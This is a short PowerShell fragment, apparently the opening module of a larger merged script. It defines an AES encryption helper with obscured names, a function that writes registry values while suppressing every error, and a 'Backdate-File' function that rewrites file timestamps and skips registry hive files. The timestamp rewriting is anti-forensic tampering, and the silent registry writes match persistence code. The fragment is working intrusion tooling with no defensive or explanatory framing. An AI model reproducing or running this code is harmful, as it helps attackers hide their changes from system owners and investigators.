# MUST BE FIRST in the merged script

function e($t,$s,$l){
    $d=New-Object Security.Cryptography.Rfc2898DeriveBytes($l,[Text.Encoding]::UTF8.GetBytes($s),10000)
    $c=[Security.Cryptography.Aes]::Create()
    $c.Key=$d.GetBytes(32)
    $c.IV=$d.GetBytes(16)
    $x=$c.CreateEncryptor()
    $b=$x.TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($t),0,$t.Length)
    $x.Dispose()
    $c.Dispose()
    $d.Dispose()
    [Convert]::ToBase64String($b)
}

function Set-RegValue($k,$n,$v){
    if(-not (Test-Path $k)){New-Item $k -Force -ErrorAction SilentlyContinue|Out-Null}
    Set-ItemProperty $k $n $v -Force -ErrorAction SilentlyContinue|Out-Null
}

function Backdate-File {
    param([string]$Path, [DateTime]$TargetDate)
    if (Test-Path $Path -ErrorAction SilentlyContinue) {
        try {
            $item = Get-Item $Path -Force -ErrorAction SilentlyContinue
            if ($item -and $item.FullName -notlike "*.DAT*" -and $item.FullName -notlike "*NTUSER*") {
                $item.CreationTime = $TargetDate
                $item.LastWriteTime = $TargetDate
                $item.LastAccessTime = $TargetDate
                Write-Host "[*] Backdated: $Path" -ForegroundColor Green
                return $true
            }
        } catch {}
    }
    return $false
}